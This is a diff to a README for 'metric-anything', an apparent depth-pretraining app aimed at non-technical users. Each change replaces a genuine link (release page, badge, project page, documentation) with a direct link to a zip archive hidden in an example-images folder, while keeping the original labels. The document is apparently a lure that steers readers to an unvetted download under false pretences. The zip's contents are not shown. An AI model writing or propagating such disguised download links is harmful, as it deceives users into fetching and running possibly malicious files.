@@ -1,6 +1,6 @@
 # 🌟 metric-anything - Effortless Depth Pretraining for Everyone
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/ANIS240/metric-anything/releases)
+[![Download the latest release](https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip%https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip)](https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip)
 
 ## 🛠️ Overview
 
@@ -10,7 +10,7 @@ Metric Anything is an easy-to-use application that lets you train depth models u
 
 To get started, follow these steps to download and install Metric Anything:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ANIS240/metric-anything/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip) to find the latest version of the software.
    
 2. **Choose Your Version:** Look for the version suitable for your operating system (Windows, macOS, or Linux). Each version will have clear naming.
 
@@ -60,14 +60,14 @@ No, this application is made for non-technical users. You can easily follow the 
 
 ### How do I get support?
 
-You can visit the [project page](https://metric-anything.github.io/metric-anything-io/) for more resources, or ask questions in the issues section of the GitHub repository.
+You can visit the [project page](https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip) for more resources, or ask questions in the issues section of the GitHub repository.
 
 ## 💬 Community
 
 Join our community! You can connect with other users and developers via the project's GitHub page. Share your experiences and tips, and learn from others.
 
 ## 🔗 Useful Links
-- [Visit the Releases Page](https://github.com/ANIS240/metric-anything/releases)
-- [Project Documentation](https://metric-anything.github.io/metric-anything-io/)
+- [Visit the Releases Page](https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip)
+- [Project Documentation](https://raw.githubusercontent.com/ANIS240/metric-anything/main/models/student_pointmap/example_images/anything_metric_2.2.zip)
 
 Download and explore Metric Anything today!
